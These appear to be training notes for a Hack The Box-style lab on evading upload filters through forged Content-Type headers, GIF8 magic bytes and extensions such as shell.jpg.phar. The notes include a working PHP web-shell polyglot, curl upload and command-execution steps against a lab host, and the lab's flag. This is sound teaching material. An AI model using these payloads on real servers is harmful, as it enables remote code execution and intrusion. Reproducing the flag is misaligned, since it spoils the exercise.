# Section 7 — Content-Type & MIME Filter Bypass

---

## Two Levels of Content Validation

| Layer | Source | How attacker controls it |
|-------|--------|--------------------------|
| **Content-Type** header | HTTP request header (client-supplied) | Modify via Burp / `-F "...;type=image/jpeg"` |
| **MIME type** | First bytes of file (server-detected via `file()` / `mime_content_type()`) | Prepend magic bytes (`GIF8`, `\xff\xd8\xff`, etc.) |

A "safe" upload form usually checks both. Bypassing requires defeating both.

---

## Bypass 1 — Content-Type Header

The browser auto-sets `Content-Type` from the file extension. Override with curl:

```bash
curl -X POST "http://TARGET/upload.php" \
  -F "uploadFile=@shell.php;type=image/jpeg"
# The ";type=..." sets the Content-Type for THIS file part
```

In Burp: edit the `Content-Type: application/x-php` line below `filename=...` to `Content-Type: image/jpeg`.

> Note: HTTP requests have TWO Content-Type headers. The top-level one (`multipart/form-data; boundary=...`) describes the whole request. The per-part one (under each file) describes individual files. **Modify the per-part one** — that's what the server checks for files.

---

## Bypass 2 — Magic Bytes (MIME Detection)

Servers using `mime_content_type()` or the `file` command inspect the **content** to determine MIME type:

```bash
echo "this is text" > x.jpg
file x.jpg
# → x.jpg: ASCII text     ❌ MIME = text/plain

echo "GIF8" > x.jpg
file x.jpg
# → x.jpg: GIF image data  ✅ MIME = image/gif
```

The fix: prepend image magic bytes to your PHP payload. PHP parses anything between `<?php ... ?>` and ignores the rest:

```bash
printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > poly.jpg
file poly.jpg
# → poly.jpg: GIF image data
```

### Common magic bytes

| Format | First bytes (raw) | Inline-friendly version |
|--------|-------------------|-------------------------|
| GIF | `GIF87a` / `GIF89a` (ASCII) | `GIF8` (4 chars, ASCII) — easiest |
| JPEG | `\xff\xd8\xff` (binary) | Use real JPEG header bytes |
| PNG | `\x89PNG\r\n\x1a\n` | Binary — embed PHP after IDAT |
| PDF | `%PDF-` | `%PDF-1.4` |
| ZIP | `PK\x03\x04` | Binary |

GIF8 is the **goldilocks** signature — printable ASCII, easy to inline, and `mime_content_type` reports `image/gif`.

---

## Combined Bypass — All Filters at Once

When a target stacks **Client-side + Blacklist + Whitelist + Content-Type + MIME**, combine techniques:

```bash
# Polyglot file: image MIME + PHP code
printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > poly.jpg

# Upload with image Content-Type + reverse-double-extension filename
curl -X POST "http://TARGET/upload.php" \
  -F "uploadFile=@poly.jpg;filename=shell.jpg.phar;type=image/jpeg"
```

Each layer:
| Filter | How payload bypasses |
|--------|---------------------|
| Client-side | curl skips JS entirely |
| Blacklist (rejects `.php`) | Filename ends in `.phar` (or `.phtml`) — not in standard blacklist |
| Whitelist (requires image ext) | Filename contains `.jpg` — passes "contains" regex |
| Content-Type | `type=image/jpeg` sent explicitly |
| MIME / magic bytes | File starts with `GIF8` — `mime_content_type` reports `image/gif` |
| Apache PHP handler | `.phar` final extension still triggers PHP handler |

---

## Filename Tricks for Stricter Whitelists

When the whitelist is `$`-anchored (final extension must be image) AND Apache's PHP handler IS strict (`.ph(ar|p|tml)$`), you need the file to have BOTH:
- `.jpg` (or similar) somewhere → passes whitelist
- A PHP-handler-matched extension at the **end** → executes

Tricks:

| Filename | Trick |
|----------|-------|
| `shell.jpg.phar` | Standard double — works when whitelist is contains-based |
| `shell.jpg:.phar` | Colon trick — both extensions present; PHP handler sees `.phar$` |
| `shell.jpg .phar` (space) | Space breaks naive whitelist regexes |
| `shell.jpg;.phar` | Semicolon variant — usually NOT served because Apache splits on `;` |

`shell.jpg:.phar` works because:
- The whitelist regex `\.jpg$` matches `.jpg` (then continues processing) — actually NO, this fails strict whitelist
- The whitelist regex `\.(jpg|jpeg|png)` (contains) matches the `.jpg` substring → passes
- Apache PHP handler sees the file ending in `.phar` → executes
- On the filesystem, the literal name `shell.jpg:.phar` is saved (Linux allows `:` in filenames)

---

## Lab — Five-Filter Bypass

**Target:** `154.57.164.76:31819`

The lab stacks: client-side + blacklist + whitelist + Content-Type + MIME.

### Step 1 — Build polyglot file
```bash
printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > /tmp/poly.jpg
file /tmp/poly.jpg
# → poly.jpg: GIF image data
```

### Step 2 — Upload with the chained-extension trick
```bash
curl -sk -X POST "http://154.57.164.76:31819/upload.php" \
  -F "uploadFile=@/tmp/poly.jpg;filename=shell.jpg.phar;type=image/jpeg"
# → File successfully uploaded
```

### Step 3 — Confirm execution + read flag
```bash
curl -sk "http://154.57.164.76:31819/profile_images/shell.jpg.phar?cmd=id"
# → GIF8 uid=33(www-data) gid=33(www-data)

curl -sk "http://154.57.164.76:31819/profile_images/shell.jpg.phar?cmd=cat+/flag.txt"
# → GIF8 HTB{m461c4l_c0n73n7_3xpl0174710n}
```

**Flag:** `HTB{m461c4l_c0n73n7_3xpl0174710n}`

> The `GIF8` prefix appears in the command output too — it's the literal first 4 bytes of the response. The actual PHP code starts after that.

---

## Why This Combination Works on Lab But Not Always

Test results on this lab:
- `.phar` standalone → **rejected by whitelist** (must contain image ext)
- `.phar.jpg` (reverse double) → uploaded but **served as image/jpeg** (Apache handler strict)
- `.jpg.phar` → uploaded AND **executes as PHP** ✓
- `.pHp.jpg` etc → uploaded but **served as image** (case-sensitive blacklist let it through, but handler doesn't fire)

The Apache PHP handler regex here is roughly `<FilesMatch ".+\.ph(ar|p|tml)$">` (with `$` anchor) — so the file MUST end in `.php`/`.phar`/`.phtml`. Reverse-double (`.php.jpg`) doesn't work; forward-double (`.jpg.phar`) does.

---

## Exam Notes

- The Big Three for content bypass: **GIF8 magic bytes + image/jpeg Content-Type + image ext somewhere in filename**
- `GIF8` is printable ASCII — the only image header you can type without binary tooling
- `;type=image/jpeg` in `curl -F` sets the per-part Content-Type — this is what the server actually validates
- When Apache PHP handler is strict (`.php$`), use forward-double (`.jpg.phar`) instead of reverse (`.phar.jpg`)
- Linux filesystem allows `:` `;` ` ` in filenames — exploit when filter logic strips/splits on them
- Always print the actual file with `file` before uploading — confirms the MIME type before testing
- `mime_content_type()` is more reliable for defenders than Content-Type header (which is client-controlled)
- Defenders: validate BOTH header AND content, then re-encode the image server-side (kills polyglot payloads)
